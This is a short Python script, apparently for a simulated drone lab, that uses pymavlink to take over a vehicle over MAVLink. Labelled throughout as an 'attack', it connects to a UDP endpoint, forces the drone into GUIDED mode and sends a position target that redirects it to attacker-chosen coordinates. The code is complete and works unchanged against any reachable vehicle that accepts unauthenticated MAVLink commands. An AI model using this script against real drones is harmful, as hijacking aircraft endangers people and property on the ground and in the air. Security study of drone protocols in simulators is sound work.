from pymavlink import mavutil
import time

# --- Configuration ---
CONNECTION_STRING = 'udp:127.0.0.1:14550'
ATTACK_LAT = -35.3600  
ATTACK_LON = -100.1600  
ATTACK_ALT = 30        
WAIT_BEFORE_ATTACK = 5
GUIDED_MODE_COPTER = 4 # GUIDED mode

# --- Main Attack Logic ---
print(f"Connecting to vehicle on: {CONNECTION_STRING}")
try:
    master = mavutil.mavlink_connection(CONNECTION_STRING)
except Exception as e:
    print(f"Failed to connect: {e}")
    exit()

print("Waiting for heartbeat...")
master.wait_heartbeat()
print(f"Heartbeat from system (system {master.target_system} component {master.target_component})")

print(f"Waiting {WAIT_BEFORE_ATTACK} seconds before launching attack...")
time.sleep(WAIT_BEFORE_ATTACK)


print("\n!!! ATTACK STAGE 1: Forcing vehicle into GUIDED mode !!!")
master.mav.command_long_send(
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,
    1,  
    GUIDED_MODE_COPTER,
    0, 0, 0, 0, 0  
)

print("Waiting for mode change confirmation...")
mode_changed = False
for _ in range(10): 
    msg = master.recv_match(type='HEARTBEAT', blocking=True, timeout=1)
    if msg and msg.custom_mode == GUIDED_MODE_COPTER:
        print("Mode change to GUIDED successful!")
        mode_changed = True
        break
    time.sleep(0.5)

if not mode_changed:
    print("Mode change failed or timed out. Aborting attack.")
    exit()

time.sleep(1) 

print("\n!!! ATTACK STAGE 2: Sending direct SET_POSITION_TARGET_GLOBAL_INT command !!!")
master.mav.set_position_target_global_int_send(
    0,
    master.target_system,
    master.target_component,
    mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
    0b0000111111111000, # type_mask (only position matters)
    int(ATTACK_LAT * 1e7), 
    int(ATTACK_LON * 1e7), 
    ATTACK_ALT,
    0, 0, 0, 
    0, 0, 0, 
    0, 0)   


print(f"Attack commands sent! Drone should be flying to LAT:{ATTACK_LAT}, LON:{ATTACK_LON}")
print("Observe the behavior in QGroundControl.")

